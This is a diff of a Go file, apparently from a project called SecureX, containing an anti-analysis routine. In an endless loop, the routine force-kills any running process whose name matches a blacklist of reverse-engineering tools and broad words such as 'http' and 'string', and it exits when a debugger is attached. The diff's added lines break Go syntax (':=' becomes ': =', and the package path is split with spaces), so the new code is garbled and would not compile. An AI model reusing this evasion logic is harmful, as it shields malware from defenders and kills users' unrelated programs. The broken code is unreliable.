@@ -1,88 +1,88 @@
-package github.com/StreamlineX/SecureX
+package github.com / StreamlineX / SecureX
 
 import (
-	"log"
-	"os"
-	"os/exec"
-	"strings"
-	"syscall"
-	"unsafe"
+    "log"
+    "os"
+    "os/exec"
+    "strings"
+    "syscall"
+    "unsafe"
 )
 
 
 func AntiDebugRun() {
-	for {
-		processes, err := exec.Command("tasklist").Output()
-		if err != nil {
-			log.Fatal(err)
-		}
+    for {
+        processes, err: = exec.Command("tasklist").Output()
+        if err != nil {
+            log.Fatal(err)
+        }
 
-		processList := string(processes)
+        processList: = string(processes)
 
-		for _, blacklistedProcess := range Blacklisted {
-			if strings.Contains(processList, blacklistedProcess) {
-				err := killProcess(blacklistedProcess)
-				if err != nil {
-					log.Fatal(err)
-				}
-			}
-		}
+        for _, blacklistedProcess: = range Blacklisted {
+            if strings.Contains(processList, blacklistedProcess) {
+                err: = killProcess(blacklistedProcess)
+                if err != nil {
+                    log.Fatal(err)
+                }
+            }
+        }
 
-		if isDebuggerAttached() {
-			log.Println("Debugger detected. Terminating...")
-			os.Exit(0)
-		}
-	}
+        if isDebuggerAttached() {
+            log.Println("Debugger detected. Terminating...")
+            os.Exit(0)
+        }
+    }
 }
 
 func killProcess(processName string) error {
-	cmd := exec.Command("taskkill", "/F", "/IM", processName)
-	cmd.Stdout = os.Stdout
-	cmd.Stderr = os.Stderr
-	return cmd.Run()
+    cmd: = exec.Command("taskkill", "/F", "/IM", processName)
+    cmd.Stdout = os.Stdout
+    cmd.Stderr = os.Stderr
+    return cmd.Run()
 }
 
 func isDebuggerAttached() bool {
-	kernel32, err := syscall.LoadLibrary("kernel32.dll")
-	if err != nil {
-		return false
-	}
-	defer syscall.FreeLibrary(kernel32)
+    kernel32, err: = syscall.LoadLibrary("kernel32.dll")
+    if err != nil {
+        return false
+    }
+    defer syscall.FreeLibrary(kernel32)
 
-	isDebuggerPresent, err := syscall.GetProcAddress(kernel32, "IsDebuggerPresent")
-	if err != nil {
-		return false
-	}
+    isDebuggerPresent, err: = syscall.GetProcAddress(kernel32, "IsDebuggerPresent")
+    if err != nil {
+        return false
+    }
 
-	isDebugging := false
+    isDebugging: = false
 
-	ret, _, _ := syscall.Syscall(uintptr(isDebuggerPresent), 0, 0, 0, 0)
-	if ret != 0 {
-		isDebugging = true
-	}
+    ret, _, _: = syscall.Syscall(uintptr(isDebuggerPresent), 0, 0, 0, 0)
+    if ret != 0 {
+        isDebugging = true
+    }
 
-	return isDebugging
+    return isDebugging
 }
 
-var Blacklisted = []string{
-	"processh",
-	"debug",
-	"debugger",
-	"hacker",
-	"inject",
-	"dump",
-	"dumper",
-	"deobfs",
-	"deobfuscator",
-	"dnspy",
-	"de4dot",
-	"dbg",
-	"string",
-	"decrypt",
-	"decryptor",
-	"detect it easy",
-	"die",
-	"unpack",
-	"unpacker",
-	"http",
+var Blacklisted = [] string {
+    "processh",
+    "debug",
+    "debugger",
+    "hacker",
+    "inject",
+    "dump",
+    "dumper",
+    "deobfs",
+    "deobfuscator",
+    "dnspy",
+    "de4dot",
+    "dbg",
+    "string",
+    "decrypt",
+    "decryptor",
+    "detect it easy",
+    "die",
+    "unpack",
+    "unpacker",
+    "http",
 }
